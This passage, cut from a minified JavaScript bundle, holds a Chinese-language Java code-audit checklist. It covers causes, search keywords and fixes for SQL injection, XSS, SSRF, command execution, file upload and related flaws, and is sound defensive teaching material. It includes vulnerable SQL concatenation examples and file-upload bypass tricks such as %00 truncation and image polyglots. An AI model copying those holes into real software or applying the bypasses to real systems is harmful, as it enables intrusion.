      \u4EFB\u610F\u6587\u4EF6\u8BFB/\u5199/\u5220\u9664/\u590D\u5236/\u79FB\u52A8/\u904D\u5386`,`
      URL\u91CD\u5B9A\u5411`,`
      \u654F\u611F\u4FE1\u606F\u6CC4\u9732`,`
      \u4EE3\u7801\u6267\u884C/\u8868\u8FBE\u5F0F\u6267\u884C`,`


  \u9AD8\u9636\u4E3E\u4F8B\uFF1A
      \u5C0F\u9ED1\uFF1A\u6CDB\u5FAEOA\u3002



  `])),Object(u.c)("\u6761\u4EF6\u7ADE\u4E89\u6F0F\u6D1E\uFF08\u7ADE\u6001\u6F0F\u6D1E\uFF09",`

`.concat(bu,`

  `)),Object(u.c)("SQL\u6CE8\u5165",`
\u6F0F\u6D1E\u6210\u56E0
    \u76F4\u63A5\u4F7F\u7528SQL\u8BED\u53E5\u62FC\u63A5\uFF0C\u5C06\u7528\u6237\u4F20\u5165\u7684\u53C2\u6570\u901A\u8FC7\u5B57\u7B26\u4E32\u62FC\u63A5\u7684\u65B9\u5F0F\u4F20\u5165\u67E5\u8BE2\u8BED\u53E5\u3002
    \u793A\u4F8B\uFF1AString sql = "select * from test where id = " + id;
    \u9884\u7F16\u8BD1\u4F7F\u7528\u6709\u8BEF\uFF0C\u6CA1\u6709\u8C03\u7528 set \u65B9\u6CD5\u5C06\u53D8\u91CF\u4E0E\u5360\u4F4D\u7B26\u8FDB\u884C\u5BF9\u5E94\u3002

\u793A\u4F8B\uFF1A
    \u5BF9 % \u548C _ \u6CA1\u6709\u8FDB\u884C\u663E\u793A\u5904\u7406\uFF0C \u5BFC\u81F4\u7528\u6237\u53EF\u4EE5\u81EA\u884C\u62FC\u63A5\u8FDB\u884C\u6A21\u7CCA\u67E5\u8BE2\u3002
    \u4E0D\u80FD\u53C2\u6570\u5316\u7684\u4F4D\u7F6E\uFF0C\u8FD8\u662F\u6709\u53EF\u80FD\u5B58\u5728\u62FC\u63A5\u7684\u60C5\u51B5\uFF0C\u5982order by\u540E\u9762\u3002
        \u793A\u4F8B\uFF1AString sql = "select * from test where id = ? order by '" + time + "' asc";
    Mybatis\u4E2D\uFF0C#{}\u662F\u9884\u7F16\u8BD1\u5904\u7406\uFF0C\${}\u662F\u5B57\u7B26\u4E32\u66FF\u6362\uFF0C\u4F7F\u7528\${}\u5C31\u53EF\u80FD\u5BFC\u81F4SQL\u6CE8\u5165\u3002
        \u793A\u4F8B\uFF1ASelect * from news where title like '%#{title}%'

\u5BA1\u8BA1\u7B56\u7565
    \u91CD\u70B9\u5173\u6CE8\u521B\u5EFA\u67E5\u8BE2\u7684\u51FD\u6570\u5982 createQuery()\u3001createSQLQuery()\u3001createNativeQuery()\u3002
    \u5B9A\u4F4DSQL\u8BED\u53E5\u4E0A\u4E0B\u6587\uFF0C\u67E5\u770B\u662F\u5426\u6709\u53C2\u6570\u76F4\u63A5\u62FC\u63A5\uFF0C\u662F\u5426\u6709\u5BF9\u6A21\u7CCA\u67E5\u8BE2\u5173\u952E\u5B57\u7684\u8FC7\u6EE4\u3002
    \u662F\u5426\u4F7F\u7528\u9884\u7F16\u8BD1\u6280\u672F\uFF0C\u9884\u7F16\u8BD1\u662F\u5426\u5B8C\u6574\uFF0C\u5173\u952E\u51FD\u6570\u5B9A\u4F4DsetObject()\u3001setInt()\u3001setString()\u3001setSQLXML()\u5173\u8054\u4E0A\u4E0B\u6587\u641C\u7D22set*\u5F00\u5934\u7684\u51FD\u6570\u3002
    Mybatis\u4E2D\u641C\u7D22\${}\uFF0C\u56E0\u4E3A\u5BF9\u4E8Elike\u6A21\u7CCA\u67E5\u8BE2\u3001order by\u6392\u5E8F\u3001\u8303\u56F4\u67E5\u8BE2in\u3001\u52A8\u6001\u8868\u540D/\u5217\u540D\uFF0C\u6CA1\u6CD5\u4F7F\u7528\u9884\u7F16\u8BD1\uFF0C\u53EA\u80FD\u62FC\u63A5\uFF0C\u6240\u4EE5\u8FD8\u662F\u9700\u8981\u624B\u5DE5\u9632\u6CE8\u5165\uFF0C\u6B64\u65F6\u53EF\u67E5\u770B\u76F8\u5173\u903B\u8F91\u662F\u5426\u6B63\u786E\u3002
    JPA\u641C\u7D22JpaSort.unsafe()\uFF0C\u67E5\u770B\u662F\u5426\u7528\u5B9E\u4F53\u4E4B\u5916\u7684\u5B57\u6BB5\u5BF9\u67E5\u8BE2\u7ED3\u679C\u6392\u5E8F\uFF0C\u8FDB\u884C\u4E86SQL\u7684\u62FC\u63A5\u3002\u4EE5\u53CA\u67E5\u770BEntityManager\u7684\u4F7F\u7528\uFF0C\u4E5F\u53EF\u80FD\u5B58\u5728\u62FC\u63A5SQL\u7684\u60C5\u51B5\u3002

\u5982\u4F55\u4FEE\u590D
    \u6B63\u786E\u4F7F\u7528\u9884\u7F16\u8BD1\uFF1B\u65E0\u8BBA\u662F SQL/HQL/JPQL\uFF0C\u90FD\u4E0D\u8FDB\u884CSQL\u8BED\u53E5\u5B57\u7B26\u4E32\u62FC\u63A5\uFF1B\u6B63\u786E\u7406\u89E3\u5360\u4F4D\u7B26\u3001\u9884\u7F16\u8BD1\u3001\u66FF\u6362\u3001\u53C2\u6570\u6CE8\u5165\u7B49\u5F62\u5F0F\u7684\u4F7F\u7528\u3002

    \u5176\u5B83\u53C2\u8003\u8D44\u6599\uFF1A        https://cloud.tencent.com/developer/article/1534109
         \u5BF9\u4E8EMybatis\u6846\u67B6\uFF1A

`.concat(K,`

  `)),Object(u.c)("XSS / \u94FE\u63A5\u6CE8\u5165 / \u6846\u67B6\u6CE8\u5165",`

\u6F0F\u6D1E\u6210\u56E0
    \u5BF9\u4E8E\u7528\u6237\u4F20\u9012\u53C2\u6570\uFF0C\u6CA1\u6709\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u6076\u610F\u653B\u51FB\u8005\u53EF\u4EE5\u63D2\u5165\u4E00\u4E9B\u6076\u610F\u7684js\u8BED\u53E5\u3001\u6807\u7B7E\u3001frame\u7B49\u6765\u83B7\u53D6\u5E94\u7528\u6216\u7528\u6237\u7684\u654F\u611F\u4FE1\u606F\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u5BA1\u8BA1\u8FC7\u7A0B\u8981\u70B9\u8FD8\u662F\u5B9A\u4F4D\u7528\u6237\u7684\u8F93\u5165\u8F93\u51FA\uFF0C\u4E5F\u5C31\u662F\u68B3\u7406\u6570\u636E\u4EA4\u4E92\u4EE5\u53CA\u524D\u7AEF\u5C55\u793A\u7684\u8FC7\u7A0B\u3002\u627E\u5230\u4E00\u6761\u5B8C\u6574\u7684\u5229\u7528\u94FE\u4E4B\u540E\uFF0C\u5C31\u662F\u7ED3\u5408\u73B0\u6709\u7684\u5B89\u5168\u63AA\u65BD\uFF08\u8F93\u51FA\u7F16\u7801\u3001\u8FC7\u6EE4\u5668\u7B49\uFF09\u8FDB\u884C\u5224\u65AD\uFF0C\u4F8B\u5982\u662F\u5426\u5B58\u5728\u7ED5\u8FC7\u7684\u53EF\u80FD\uFF0C\u6216\u8005\u662F\u6CA1\u6709\u4EFB\u4F55\u5B89\u5168\u9632\u62A4\u53EF\u76F4\u63A5\u9020\u6210\u653B\u51FB\u3002
    \u4E0B\u9762\u662F\u4E00\u4E9B\u53EF\u4EE5\u5FEB\u901F\u5B9A\u4F4D\u7684\u5173\u952E\u5B57\uFF1A
        <%=
        \${
        <c:out
        <c:if
        <c:forEach
        ModelAndView
        ModelMap
        Model
        request.getParameter
        request.setAttribute
    \u4E00\u822C\u4F1A\u4F7F\u7528\u5168\u5C40\u7684Filter\u8FDB\u884Cxss\u7684\u8FC7\u6EE4\uFF0C\u4F46\u901A\u5E38\u53EF\u80FD\u5B58\u5728\u6F0F\u7F51\u4E4B\u9C7C\uFF0C\u6240\u4EE5\u4E5F\u9700\u8981\u5BA1\u8BA1\u5168\u5C40\u8FC7\u6EE4\u89C4\u5219\u662F\u5426\u5B8C\u5584\u3002\u53EF\u4EE5\u901A\u8FC7\u5173\u952E\u5B57 XssFilter \u8FDB\u884C\u641C\u7D22\u3002

\u5982\u4F55\u4FEE\u590D
    \u81EA\u5B9A\u4E49\u5168\u5C40\u8FC7\u6EE4\u5668\uFF0C\u5BF9\u7528\u6237\u63D0\u4EA4\u8F93\u5165\u8FDB\u884C\u68C0\u67E5\u548C\u8FC7\u6EE4\uFF1B\u5BF9\u7528\u6237\u8F93\u5165\u5E76\u7528\u6765\u5C55\u793A\u7684\u6570\u636E\u8FDB\u884CHTML\u8F6C\u4E49\uFF0C\u53EF\u7528\u7684\u5DE5\u5177\u7C7B\u5305\u62ECorg.springframework.web.util.HtmlUtils \u3001org.apache.commons.lang3.StringEscapeUtils\u3001ESAPI.encoder().encodeForHTML \u7B49\u3002

  `),Object(u.c)("XML\u6CE8\u5165 / XXE\u6CE8\u5165",nu),Object(u.c)("\u786C\u7F16\u7801",`
        \u6F0F\u6D1E\u6210\u56E0
          \u5982\u679C\u5C06\u654F\u611F\u4FE1\u606F\uFF08\u5305\u62EC\u53E3\u4EE4\u548C\u52A0\u5BC6\u5BC6\u94A5\uFF09\u786C\u7F16\u7801\u5728\u7A0B\u5E8F\u4E2D\uFF0C\u53EF\u80FD\u4F1A\u5C06\u654F\u611F\u4FE1\u606F\u66B4\u9732\u7ED9\u653B\u51FB\u8005\u3002\u4EFB\u4F55\u80FD\u591F\u8BBF\u95EE\u5230class\u6587\u4EF6\u7684\u4EBA\u90FD\u53EF\u4EE5\u53CD\u7F16\u8BD1class\u6587\u4EF6\u5E76\u53D1\u73B0\u8FD9\u4E9B\u654F\u611F\u4FE1\u606F\u3002\u56E0\u6B64\uFF0C\u4E0D\u80FD\u5C06\u4FE1\u606F\u786C\u7F16\u7801\u5728\u7A0B\u5E8F\u4E2D\u3002

        \u5BA1\u8BA1\u7B56\u7565
          \u5BA1\u8BA1\u6E90\u4EE3\u7801\u4E2D\u662F\u5426\u6709\u786C\u7F16\u7801\u654F\u611F\u4FE1\u606F\uFF1A
              password
              pass
              jdbc
              auth

        \u5982\u4F55\u4FEE\u590D
          \u52A8\u6001\u83B7\u53D6\u654F\u611F\u4FE1\u606F\uFF0C\u901A\u8FC7\u914D\u7F6E\u6587\u4EF6\u3001\u8BFB\u53D6\u6570\u636E\u5E93\u6216\u5176\u4ED6\u624B\u6BB5\u3002
  `),Object(u.c)("\u4E34\u65F6\u6587\u4EF6\u5220\u9664",`
        \u6F0F\u6D1E\u6210\u56E0
          \u5F00\u53D1\u4EBA\u5458\u4F1A\u5728\u5168\u5C40\u53EF\u5199\u7684\u76EE\u5F55\u4E2D\u521B\u5EFA\u4E34\u65F6\u6587\u4EF6\u3002\u8FD9\u7C7B\u76EE\u5F55\u4E2D\u7684\u6587\u4EF6\u53EF\u80FD\u4F1A\u88AB\u5B9A\u671F\u6E05\u7406\uFF0C\u7136\u800C\uFF0C\u5982\u679C\u6587\u4EF6\u672A\u88AB\u5B89\u5168\u5730\u521B\u5EFA\u6216\u8005\u7528\u5B8C\u540E\u8FD8\u662F\u53EF\u8BBF\u95EE\u7684\uFF0C\u653B\u51FB\u8005\u4FBF\u53EF\u4EE5\u5229\u7528\u5171\u4EAB\u76EE\u5F55\u4E2D\u7684\u6587\u4EF6\u64CD\u4F5C\u83B7\u53D6\u672C\u5730\u6587\u4EF6\u7CFB\u7EDF\u8BBF\u95EE\u6743\u9650\u3002

        \u5BA1\u8BA1\u7B56\u7565
          \u91CD\u70B9\u6587\u4EF6\u5E94\u7528\u7A0B\u5E8F\u521B\u5EFA\u65B0\u6587\u4EF6\u65F6\u662F\u5426\u4E3A\u4E34\u65F6\u6587\u4EF6\uFF0C\u5728\u4F7F\u7528\u540E\u662F\u5426\u5BF9\u4E34\u65F6\u8FDB\u884C\u53CA\u65F6\u7684\u5220\u9664\u3002
          \u53EF\u4EE5\u641C\u7D22\u5173\u952E\u5B57File\u3001FileOutputStream\u3001tempFile\u3001FileUtils\u8FDB\u884C\u67E5\u627E\u3002

        \u5982\u4F55\u4FEE\u590D
          \u53EF\u4EE5\u4F7F\u7528NIO\u4E2D\u7684createTempFile() \u65B9\u6CD5\u521B\u5EFA\u4E34\u65F6\u6587\u4EF6\uFF0C\u8FD9\u79CD\u65B9\u6CD5\u65E0\u8BBA\u662F\u5426\u6709\u5F02\u5E38\uFF0C\u90FD\u4F1A\u81EA\u52A8\u5173\u95ED\u6587\u4EF6\uFF0C\u4F7F\u7528DELETE_ON_CLOSE\u9009\u9879\uFF0C\u5728\u6587\u4EF6\u5173\u95ED\u65F6\u81EA\u52A8\u5220\u9664\u3002
          \u6216\u5728\u4E1A\u52A1\u903B\u8F91\u5904\u7406\u5B8C\u6210\u540E\u663E\u5F0F\u5730\u8FDB\u884C\u5220\u9664\uFF0C\u4F46\u8981\u6CE8\u610F\u6761\u4EF6\u7ADE\u4E89\u95EE\u9898\u3002
  `),Object(u.c)("\u4E0D\u5B89\u5168\u7684\u53CD\u5C04",`
        \u6F0F\u6D1E\u6210\u56E0
          \u5F00\u53D1\u4EBA\u5458\u5982\u679C\u63D0\u4F9B\u4E86\u63A5\u53E3\uFF0C\u53EF\u4EE5\u7531\u8BBF\u95EE\u4EBA\u5458\u4E3A\u5E94\u7528\u7A0B\u5E8F\u63D0\u4F9B\u786E\u5B9A\u5B9E\u4F8B\u5316\u54EA\u4E2A\u7C7B\u6216\u8C03\u7528\u54EA\u4E2A\u65B9\u6CD5\u7684\u53C2\u6570\u503C\uFF0C\u90A3\u4E48\u5C31\u6709\u53EF\u80FD\u521B\u5EFA\u4E00\u4E2A\u8D2F\u7A7F\u4E8E\u6574\u4E2A\u5E94\u7528\u7A0B\u5E8F\u7684\u63A7\u5236\u6D41\u8DEF\u5F84\uFF0C\u800C\u8BE5\u8DEF\u5F84\u5E76\u975E\u662F\u5E94\u7528\u7A0B\u5E8F\u5F00\u53D1\u8005\u6700\u521D\u8BBE\u8BA1\u7684\u3002
          \u800C\u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528\u8FD9\u6837\u7684\u63A5\u53E3\u8C03\u7528\u975E\u9884\u671F\u7684\u4EFB\u610F\u65B9\u6CD5\u6267\u884C\u6587\u4EF6\u5199\u5165\u3001\u547D\u4EE4\u6267\u884C\u6216\u8005\u5176\u4ED6\u7684\u6076\u610F\u64CD\u4F5C\u3002

        \u5BA1\u8BA1\u7B56\u7565
          \u67E5\u770B\u5F00\u53D1\u4EBA\u5458\u662F\u5426\u5BF9\u53CD\u5C04\u8C03\u7528\u65B9\u6CD5\u3001\u53CD\u5C04\u521B\u5EFA\u7C7B\u5B9E\u4F8B\u8FDB\u884C\u4E86\u5C01\u88C5\uFF0C\u5E76\u662F\u5426\u5728\u5BF9\u5916\u7684\u63A5\u53E3\u4E2D\u8FDB\u884C\u4E86\u76F8\u5173\u7684\u8C03\u7528\u3002
              Class.forName
              Method.invoke
              newInstance
              Worker/Invoker

        \u5982\u4F55\u4FEE\u590D
          \u907F\u514D\u5BF9\u5916\u5F00\u653E\u5177\u6709\u76F8\u5173\u529F\u80FD\u7684\u63A5\u53E3\uFF0C\u6216\u5728\u8C03\u7528\u524D\u8FDB\u884C\u4E25\u683C\u7684\u5BA1\u67E5\u3002
  `),Object(u.c)("\u4F7F\u7528\u4E86\u4E0D\u5B89\u5168\u7684\u7EC4\u4EF6",`
        \u6F0F\u6D1E\u6210\u56E0
          \u5F00\u53D1\u4EBA\u5458\u5728\u5F00\u53D1\u5E94\u7528\u7A0B\u5E8F\u65F6\u53EF\u80FD\u4F1A\u5F15\u7528\u7B2C\u4E09\u65B9\u7684\u7EC4\u4EF6\uFF0C\u8FD9\u4E9B\u7EC4\u4EF6\u53EF\u80FD\u88AB\u62A5\u51FA\u8FC7\u5B89\u5168\u6F0F\u6D1E\uFF0C\u4F46\u662F\u4F7F\u7528\u8005\u7531\u4E8E\u79CD\u79CD\u539F\u56E0\u6CA1\u6709\u53CA\u65F6\u5347\u7EA7\uFF0C\u56E0\u6B64\u53EF\u80FD\u5BFC\u81F4\u5B58\u5728\u5386\u53F2\u9057\u7559\u7684\u95EE\u9898\u3002
          \u7EC4\u4EF6\u4F8B\u5982 fastjson\u3001jackson\u3001xstream\uFF0C\u6846\u67B6\u4F8B\u5982 struts2\u3001spring \u7B49\u7B49\uFF0C\u90FD\u8981\u6CE8\u610F\u4F7F\u7528\u7684\u7248\u672C\u95EE\u9898\u3002

        \u5BA1\u8BA1\u7B56\u7565
          \u5173\u6CE8 maven \u548C gradle \u7B49\u5305\u7BA1\u7406\u8F6F\u4EF6\u5904\u7406\u7684\u5E94\u7528\u7A0B\u5E8F\u4F9D\u8D56\uFF0C\u5173\u6CE8\u5F00\u53D1\u4EBA\u5458\u6240\u4F7F\u7528\u7684\u5E94\u7528\u7A0B\u5E8F\u7248\u672C\uFF0C\u67E5\u770B\u662F\u5426\u5177\u6709\u5B58\u5728\u6F0F\u6D1E\u7684\u7248\u672C\uFF0C\u5E76\u67E5\u770B\u5176\u5177\u4F53\u8C03\u7528\u4F4D\u7F6E\uFF0C\u770B\u662F\u5426\u80FD\u591F\u7EC4\u5408\u6210\u76F8\u5173\u6F0F\u6D1E\u3002
          \u5FC5\u8981\u65F6\u53EF\u501F\u52A9 SCA \u5BA1\u67E5\u5DE5\u5177\u6765\u5B9E\u73B0\u3002

        \u5982\u4F55\u4FEE\u590D
          \u786E\u4FDD\u5E94\u7528\u7A0B\u5E8F\u4F7F\u7528\u8F83\u65B0\u7684\u3001\u6216\u5B89\u88C5\u4E86\u5B89\u5168\u8865\u4E01\u7684\u7EC4\u4EF6\u3002
  `),Object(u.c)("\u547D\u4EE4\u6267\u884C",`
\u6F0F\u6D1E\u6210\u56E0
    \u7531\u4E8E\u4E1A\u52A1\u9700\u6C42\uFF0C\u5E94\u7528\u7A0B\u5E8F\u53EF\u80FD\u542B\u6709\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\u7684\u529F\u80FD\uFF0C\u5982\u679C\u6267\u884C\u7684\u547D\u4EE4\u4EFB\u610F\u7528\u6237\u53EF\u63A7\uFF0C\u5219\u5C06\u4EA7\u751F\u6781\u5927\u7684\u5371\u5BB3\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u91CD\u70B9\u5173\u6CE8\u80FD\u6267\u884C\u547D\u4EE4\u7684\u4E00\u4E9B\u529F\u80FD\u53CA\u51FD\u6570\uFF1A
        Runtime.getRuntime().exec()
        Process
        UNIXProcess
        ProcessImpl
        ProcessBuilder.start()
        GroovyShell.evaluate()

\u5982\u4F55\u4FEE\u590D
    \u907F\u514D\u4F7F\u7528\u8FD9\u6837\u7684\u529F\u80FD\uFF0C\u5982\u5FC5\u987B\uFF0C\u5F85\u6267\u884C\u547D\u4EE4\u5C3D\u91CF\u4E0D\u7531\u7528\u6237\u4F20\u5165\u3002
  `),Object(u.c)("SSRF",`

\u6F0F\u6D1E\u6210\u56E0
    SSRF\u5F62\u6210\u7684\u539F\u56E0\u5927\u90FD\u662F\u7531\u4E8E\u4EE3\u7801\u4E2D\u63D0\u4F9B\u4E86\u4ECE\u5176\u4ED6\u670D\u52A1\u5668\u5E94\u7528\u83B7\u53D6\u6570\u636E\u7684\u529F\u80FD\u4F46\u6CA1\u6709\u5BF9\u76EE\u6807\u5730\u5740\u505A\u8FC7\u6EE4\u4E0E\u9650\u5236\u3002\u6BD4\u5982\u4ECE\u6307\u5B9AURL\u94FE\u63A5\u83B7\u53D6\u56FE\u7247\u3001\u4E0B\u8F7D\u7B49\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u51FA\u73B0SSRF\u6F0F\u6D1E\u7684\u4E3B\u8981\u4E1A\u52A1\u6709\uFF1A
        \u901A\u8FC7URL\u5730\u5740\u5206\u4EAB\u7F51\u9875\u5185\u5BB9
        \u5728\u7EBF\u670D\u52A1
        \u901A\u8FC7URL\u5730\u5740\u52A0\u8F7D\u6216\u4E0B\u8F7D\u56FE\u7247
        \u52A0\u8F7D\u8FDC\u7AEF\u914D\u7F6E
    \u91CD\u70B9\u5173\u6CE8\u4E00\u4E9BHTTP\u8BF7\u6C42\u64CD\u4F5C\u51FD\u6570\uFF1A
        om.alibaba.druid.util.HttpClientUtils
        sun.net.www.http.HttpClient
        javax.net.ssl.HttpsURLConnection
        sun.net.www.protocol.http.HttpURLConnection
        java.net.HttpURLConnection
        javax.servlet.http.HttpServletRequest
        java.net.URI
        java.net.URL
        java.net.URLConnection
        com.bea.uddiexplorer.Search
        com.squareup.okhttp.Request
        com.squareup.okhttp3.Request
        org.apache.commons.httpclient.HttpMethodBase
        org.apache.http.client.methods.HttpRequestBase
    \u9664\u4E86\u5EFA\u7ACBHTTP\u534F\u8BAE\u8FDE\u63A5\uFF0C\u8FD8\u53EF\u80FD\u76F4\u63A5\u901A\u8FC7 Socket\u5EFA\u7ACB\u8FDE\u63A5\uFF0C\u56E0\u6B64\u5E94\u8BE5\u540C\u6837\u5173\u6CE8Socket\u76F8\u5173\u7C7B\uFF1A
        AsynchronousServerSocketChannel.accept/bind
        AsynchronousSocketChannel.write/read/bind/connect
        ServerSocketChannel.bind
        ServerSocket.accept/bind
        Socket.bind/connect
        Socket.getInputStream().read
        Socket.getOutputStream().write
        SocketChannel.bind/read/write/connect

\u5982\u4F55\u4FEE\u590D
    \u4F7F\u7528\u767D\u540D\u5355\u6821\u9A8CHTTP\u8BF7\u6C42url\u5730\u5740\uFF0C\u4F8B\u5982\u901A\u8FC7InetAddress\u5BF9\u8C61\u7684isSiteLocalAddress()\u65B9\u6CD5\u8FDB\u884C\u5224\u65AD\uFF0C\u7981\u6B62\u5185\u7F51\u5730\u5740\u7684\u7F51\u7EDC\u8BF7\u6C42\u3002
    \u907F\u514D\u5C06\u8BF7\u6C42\u54CD\u5E94\u53CA\u9519\u8BEF\u4FE1\u606F\u8FD4\u56DE\u7ED9\u7528\u6237
    \u7981\u7528\u4E0D\u9700\u8981\u7684\u534F\u8BAE\u53CA\u9650\u5236\u8BF7\u6C42\u7AEF\u53E3


  `),Object(u.c)("\u6587\u4EF6\u4E0A\u4F20",`

\u6F0F\u6D1E\u6210\u56E0
    \u6587\u4EF6\u4E0A\u4F20\u65F6\uFF0C\u7531\u4E8E\u6821\u9A8C\u4E0D\u5168\u3001\u9650\u5236\u4E0D\u5F53\uFF0C\u53EF\u80FD\u5BFC\u81F4\u88AB\u4E0A\u4F20webshell\u3001\u62D2\u7EDD\u670D\u52A1\u3001\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u7B49\u5B89\u5168\u95EE\u9898\u3002

\u5BA1\u8BA1\u7B56\u7565
    1. \u9996\u5148\u5173\u6CE8\u6587\u4EF6\u540E\u7F00\u9A8C\u8BC1\uFF0C\u4F7F\u7528\u767D\u540D\u5355\u6216\u9ED1\u540D\u5355\uFF0C\u5EFA\u8BAE\u4F7F\u7528\u767D\u540D\u5355\u3002\u4F7F\u7528lastIndexOf()\u65B9\u6CD5\u83B7\u53D6\u6587\u4EF6\u540E\u7F00\uFF0C\u4F7F\u7528IndexOf()\u53EF\u80FD\u88AB\u7ED5\u8FC7\u3002\u5982\u679C\u662F\u767D\u540D\u5355\u9A8C\u8BC1\u65F6\uFF0C\u4F7F\u7528toLowerCase()\u5904\u7406\u518D\u8FDB\u884C\u5BF9\u6BD4\uFF0C\u6216\u4F7F\u7528equalsIgnoreCase()\uFF0C\u907F\u514D\u88AB\u5927\u5C0F\u5199\u7ED5\u8FC7\u3002
    2. \u662F\u5426\u6821\u9A8C\u4E86\u6587\u4EF6\u7684\u5927\u5C0F\u3002
    3. \u662F\u5426\u6821\u9A8C\u4E86\u6587\u4EF6\u7C7B\u578BgetContentType()\uFF0C\u8FD9\u79CD\u65B9\u5F0F\u867D\u7136\u80FD\u591F\u88AB\u7ED5\u8FC7\uFF0C\u4F46\u8FD8\u662F\u4F1A\u589E\u52A0\u653B\u51FB\u6210\u672C\u3002
    4. \u5BF9\u4E8E\u4F7F\u7528Hutool\u7684FileTypeUtil\u7684getType()\u6216ImageIO.read()\u901A\u8FC7\u8BFB\u53D6\u6587\u4EF6\u6D41\u4E2D\u524DN\u4E2Abyte\u503C\u6765\u5224\u65AD\u6587\u4EF6\u7C7B\u578B\u7684\uFF0C\u4E5F\u53EF\u4EE5\u4F7F\u7528\u7C7B\u4F3C\u56FE\u7247\u9A6C\u7684\u65B9\u5F0F\u8FDB\u884C\u7ED5\u8FC7\u3002
    5. "%00"\u622A\u65AD\u80FD\u5426\u7ED5\u8FC7\u3002
    6. QP\u7F16\u7801\u7279\u6027\u80FD\u5426\u7ED5\u8FC7\u3002javax.mail.internet.MimeUtility.encodeWord()\u65B9\u6CD5\u3002
    7. \u6709\u4E00\u4E9B\u5B89\u5168\u6821\u9A8C\u7684\u987A\u5E8F\u6709\u95EE\u9898\uFF0C\u5148\u5C06\u6587\u4EF6\u4FDD\u5B58\uFF0C\u518D\u8FDB\u884C\u5B89\u5168\u68C0\u6D4B\uFF0C\u5982\u679C\u4E0D\u901A\u8FC7\u68C0\u6D4B\u5219\u8FDB\u884C\u5220\u9664\uFF0C\u6B64\u65F6\u53EF\u4EE5\u5728\u6587\u4EF6\u4FDD\u5B58\u540E\u89E6\u53D1\u62A5\u9519\u7EC8\u6B62\u6D41\u7A0B\uFF0C\u5BFC\u81F4\u4E0D\u5220\u9664\u6587\u4EF6\u3002

    8. \u91CD\u70B9\u662F\u6587\u4EF6\u4E0A\u4F20\u76F8\u5173\u7C7B\u6216\u51FD\u6570\uFF1A
        FileUpload
        FileUploadBase
        FileItemIteratorImpl
        FileItemStreamImpl
        FileUtils
        UploadHandleServlet
        FileLoadServlet
        FileOutputStream
        DiskFileItemFactory
        MultipartRequestEntity
        MultipartFile
        com.oreilly.servlet.MultipartRequest

\u5982\u4F55\u4FEE\u590D
    \u5BF9\u4E0A\u4F20\u6587\u4EF6\u540E\u7F00\u8FDB\u884C\u767D\u540D\u5355\u9A8C\u8BC1\uFF0C\u9A8C\u8BC1\u6587\u4EF6\u5927\u5C0F\uFF0C\u5F3A\u5236\u91CD\u547D\u540D\u540E\u7F00\uFF0C\u4E0A\u4F20\u6587\u4EF6\u5355\u72EC\u670D\u52A1\u5668\u4FDD\u5B58\u3002


  `),Object(u.c)("\u4EFB\u610F\u6587\u4EF6\u8BFB/\u5199/\u5220\u9664/\u590D\u5236/\u79FB\u52A8/\u904D\u5386",`

\u6F0F\u6D1E\u6210\u56E0
    \u5E94\u7528\u7A0B\u5E8F\u7531\u4E8E\u4E1A\u52A1\u9700\u6C42\uFF0C\u63D0\u4F9B\u4E86\u6587\u4EF6\u64CD\u4F5C\u7684\u4E00\u7CFB\u5217\u529F\u80FD\uFF0C\u4F46\u6587\u4EF6\u540D\u3001\u6587\u4EF6\u8DEF\u5F84\u7B49\u7531\u7528\u6237\u63A7\u5236\uFF0C\u5728\u6821\u9A8C\u4E0D\u5F53\u7684\u60C5\u51B5\u4E0B\uFF0C\u7528\u6237\u53EF\u4EE5\u7ED5\u8FC7\u9650\u5236\u5BF9\u670D\u52A1\u5668\u4E0A\u4EFB\u610F\u6587\u4EF6\u8FDB\u884C\u64CD\u4F5C\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u9996\u5148\u5173\u6CE8\u5305\u542B\u8FD9\u4E9B\u529F\u80FD\u7684\u7C7B\u548C\u51FD\u6570\uFF1A
        sun.nio.ch.FileChannelImpl
        java.io.File.list/listFiles
        java.io.FileInputStream
        java.io.FileOutputStream
        java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem
        sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider
        java.io.RandomAccessFile
        sun.nio.fs.CopyFile
        sun.nio.fs.UnixChannelFactory
        sun.nio.fs.WindowsChannelFactory
        java.nio.channels.AsynchronousFileChannel
        FileUtil/IOUtil
        filePath/download/deleteFile/move/getFile
    \u5728\u4F7F\u7528\u8FD9\u4E9B\u51FD\u6570\u65F6\uFF0C\u5BF9\u4E8E\u7528\u6237\u4F20\u9012\u6765\u7684\u6587\u4EF6\u5BF9\u8C61/\u6587\u4EF6\u540D/\u6587\u4EF6\u8DEF\u5F84\uFF0C\u662F\u5426\u8FDB\u884C\u4E86\u6B63\u786E\u7684\u5904\u7406\uFF1A
        1. \u662F\u5426\u9650\u5236\u4E86\u53EF\u64CD\u4F5C\u6587\u4EF6\u7684\u8DEF\u5F84\u3001\u6587\u4EF6\u7C7B\u578B\u3001\u6587\u4EF6\u6240\u6709\u8005\u3002
        2. \u662F\u5426\u5C06\u654F\u611F\u6587\u4EF6\u8FDB\u884C\u6392\u9664\u3002
        3. \u67E5\u627EgetPath(), getAbsolutePath()\uFF0C\u67E5\u770B\u662F\u5426\u6709\u9519\u8BEF\u7684\u8DEF\u5F84\u5224\u65AD\u3002
    \u518D\u6392\u67E5\u7A0B\u5E8F\u7684\u5B89\u5168\u7B56\u7565\u914D\u7F6E\u6587\u4EF6\uFF0C\u5168\u5C40\u641C\u7D22permission\u3001Java.io.FilePermission\u3001grant\u5B57\u6837\u3002\u67E5\u770B\u662F\u5426\u53EA\u4E3A\u7A0B\u5E8F\u7684\u67D0\u90E8\u5206\u8DEF\u5F84\u8D4B\u4E88\u8BFB\u5199\u6743\u9650\u3002

\u5982\u4F55\u4FEE\u590D
    1. \u5BF9\u8981\u64CD\u4F5C\u7684\u6587\u4EF6\u540D\u8FDB\u884C\u9ED1\u767D\u540D\u5355\u9650\u5236\u3002
    2. \u5BF9\u7528\u6237\u8F93\u5165\u7684\u6570\u636E\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u8FC7\u6EE4\u6389"./"\u3001"\u2026/"\u3001"%"\u3001"/"
